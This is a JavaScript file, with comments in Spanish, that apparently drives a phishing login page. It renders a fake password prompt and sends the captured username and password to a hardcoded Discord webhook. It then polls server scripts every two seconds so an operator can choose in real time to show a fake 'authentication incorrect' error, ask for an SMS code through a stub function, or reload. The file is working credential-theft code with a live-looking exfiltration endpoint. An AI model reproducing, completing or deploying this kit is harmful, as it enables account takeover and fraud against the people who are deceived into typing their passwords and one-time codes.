const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1481813956774596669/5hdY6963mwZyIlxMYXm8qRaKwOj68BsVFmGVCKdl4xpExXdfIUZwFaDSkyNqE7ZUuOGz";

const modalPass = document.getElementById('modalPass');
const modalContent = document.getElementById('modalContent');
const userField = document.getElementById('userField');

// 1. Iniciar el proceso
document.getElementById('step1').addEventListener('submit', (e) => {
    e.preventDefault();
    modalPass.style.display = 'flex';
    renderPasswordUI();
});

// 2. Interfaz de Contraseña (Con el estilo gris que pediste)
function renderPasswordUI() {
    modalContent.innerHTML = `
        <div class="modal-box" style="background: white; width: 400px; padding: 35px; border-radius: 4px; text-align: center;">
            <h3 style="color: #0067b1; margin-bottom: 30px;">Introduce tu contraseña</h3>
            <form id="passForm">
                <div style="background: #f5f5f5; padding: 12px 15px; border-bottom: 2px solid #d32f2f; border-radius: 4px 4px 0 0; margin-bottom: 30px;">
                    <input type="password" id="passInput" placeholder="Contraseña" required style="border: none; width: 100%; outline: none; font-size: 18px; background: transparent;">
                </div>
                <div style="display: flex; gap: 12px;">
                    <button type="submit" class="btn-entrar" style="flex:1;">Continuar</button>
                </div>
            </form>
        </div>
    `;
    document.getElementById('passForm').addEventListener('submit', enviarDatosYEperar);
}

// 3. Enviar a Discord y empezar a consultar al PHP
async function enviarDatosYEperar(e) {
    e.preventDefault();
    const password = document.getElementById('passInput').value;

    // Enviar a Discord
    fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            content: "🔑 **DATOS RECIBIDOS**",
            embeds: [{ fields: [{name: "User", value: userField.value}, {name: "Pass", value: password}] }]
        })
    });

    // Cambiar estado a "esperar" en el servidor (reset)
    fetch('admin.php', { method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: 'accion=esperar' });

    // Mostrar Loading e iniciar consulta constante al PHP
    consultarOrdenEnVivo();
}

// 4. EL BUCLE: Pregunta al PHP cada 2 segundos qué hacer
function consultarOrdenEnVivo() {
    modalContent.innerHTML = `<div class="spinner"></div><p style="margin-top:15px; color:#0067b1; font-weight:bold;">Validando información...</p>`;

    const chequear = setInterval(async () => {
        try {
            const respuesta = await fetch('api.php');
            const data = await respuesta.json();

            if (data.orden === "error_azul") {
                clearInterval(chequear);
                renderErrorAzul();
            } else if (data.orden === "pedir_sms") {
                clearInterval(chequear);
                renderSMSUI();
            } else if (data.orden === "finalizar") {
                clearInterval(chequear);
                location.reload();
            }
        } catch (error) {
            console.log("Conectando con el servidor...");
        }
    }, 2000); // Consulta cada 2 segundos
}

// Funciones de renderizado (Error azul y SMS como ya los teníamos)
function renderErrorAzul() {
    modalContent.style = "background: transparent; box-shadow: none; padding: 0;";
    modalContent.innerHTML = `
        <div style="background: #005fa4; display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; border-radius: 6px; color: white; width: 480px;">
            <p>Autenticación incorrecta.</p>
            <button onclick="location.reload()" style="background: #3d7cc9; color: white; border: none; padding: 8px 25px; border-radius: 20px; font-weight: bold; cursor: pointer;">Aceptar</button>
        </div>
    `;
}

function renderSMSUI() {
    // Aquí pegas la función de SMS que ya teníamos, pero que al final 
    // en lugar de terminar, puede volver a llamar a "consultarOrdenEnVivo()" 
    // si quieres pedir un segundo código manualmente.
}
